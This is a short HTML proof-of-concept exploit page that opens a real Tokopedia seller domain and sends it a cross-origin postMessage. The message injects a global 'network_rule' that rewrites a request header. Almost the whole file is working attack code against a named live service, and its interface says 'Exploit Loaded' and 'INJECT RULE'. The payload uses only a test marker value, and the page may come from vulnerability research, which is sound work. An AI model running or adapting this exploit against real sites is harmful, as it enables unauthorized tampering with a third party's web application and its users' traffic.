<!DOCTYPE html>
<html>
<head>
    <title>PoC Check</title>
    <style>
        body { background-color: #121212; color: #00ff00; font-family: monospace; text-align: center; padding-top: 100px; }
        .box { border: 2px solid #00ff00; padding: 20px; display: inline-block; }
        button { background: #00ff00; color: black; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <h1>[ SYSTEM READY ]</h1>
        <p>Status: Exploit Loaded</p>
        <button onclick="attack()">INJECT RULE</button>
    </div>

    <script>
        function attack() {
            console.log("Launching...");
            const targetWin = window.open("https://shop-id.tokopedia.com", "_blank");

            setTimeout(function() {
                if (targetWin) {
                    targetWin.postMessage({
                        source: "main_thread",
                        eventName: "network_rule",
                        data: [{
                            ruleName: "final_test",
                            global: true,
                            conditions: [],
                            handlers: [{
                                handler: "replace",
                                type: "header",
                                field: "X-Pns-Referrer",
                                value: "VULN_SUCCESS"
                            }]
                        }]
                    }, "*");
                    alert("Exploit Sent! Check Tokopedia Tab.");
                }
            }, 5000); // Kasih waktu 5 detik biar beneran ke-load
        }
    </script>
</body>
</html>
